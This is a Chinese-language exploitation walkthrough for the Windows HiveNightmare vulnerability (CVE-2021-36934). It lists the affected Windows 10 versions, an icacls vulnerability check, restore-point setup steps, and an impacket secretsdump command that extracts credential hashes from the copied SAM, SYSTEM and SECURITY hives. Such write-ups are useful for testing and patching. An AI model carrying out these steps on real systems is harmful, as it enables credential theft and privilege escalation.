### CVE-2021-36934

#### 描述

Windows Elevation 漏洞

#### 影响版本

| Product             | CPU Architecture | Version | Update | Tested             |
| ------------------- | ---------------- | ------- | ------ | ------------------ |
| Windows 10 | x64/x86/ARM64 | 1809 |  |  |
| Windows 10 | x64/x86/ARM64 | 1909 | |        |
| Windows 10 | x64/x86/ARM64 | 2004 | | &#10004; |
| Windows 10 | x64/x86/ARM64 | 20H2 | | |
| Windows 10 | x64/x86/ARM64 | 21H1 | | |

#### 修复补丁

```
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-36934
```

#### 利用方式

编译环境

- VS2019（V140）X64 Release
- VS2019（V140）X86 Release

测试系统Windows 10 2004 X64

使用命令来查看目标系统是否是易受攻击的

```
icacls C:\windows\system32\config\sam
```

当出现如下图所示就表明是易受攻击的机器

![image-20210905164036648](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2021-36934_Windows_10_2004_X64_1.png)

然后需要开启系统还原，右键“此电脑->属性”，点击“系统保护->配置->启用系统保护->应用->确定”

![image-20210905164831213](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2021-36934_Windows_10_2004_X64_2.png)

然后创建系统还原点

![image-20210905164912574](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2021-36934_Windows_10_2004_X64_3.png)

接着使用EXP即可获取到系统的SAM，SYSTEM和SECURITY文件

![1](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2021-36934_Windows_10_2004_X64_4.gif)

最后使用impacket项目进行登录即可

```
git clone https://github.com/SecureAuthCorp/impacket.git 
cd impacket/examples 
python3 secretsdump.py -sam SAM-2021-07-11 -system SYSTEM-2021-07-11  -security SECURITY-2021-07-11 LOCAL
```



#### 代码来源

- [GossiTheDog](https://github.com/GossiTheDog/HiveNightmare)